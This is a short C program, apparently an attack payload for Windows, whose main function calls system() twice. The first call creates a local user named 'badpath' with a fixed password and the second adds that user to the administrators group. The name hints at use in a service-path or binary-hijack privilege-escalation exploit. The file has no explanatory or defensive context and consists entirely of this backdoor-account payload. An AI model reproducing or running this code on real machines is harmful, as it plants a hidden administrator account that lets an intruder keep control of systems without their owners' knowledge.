#include <stdlib.h>

void main() {
	system("net user /ADD badpath 123123123");
	system("net localgroup administrators badpath /ADD");
}
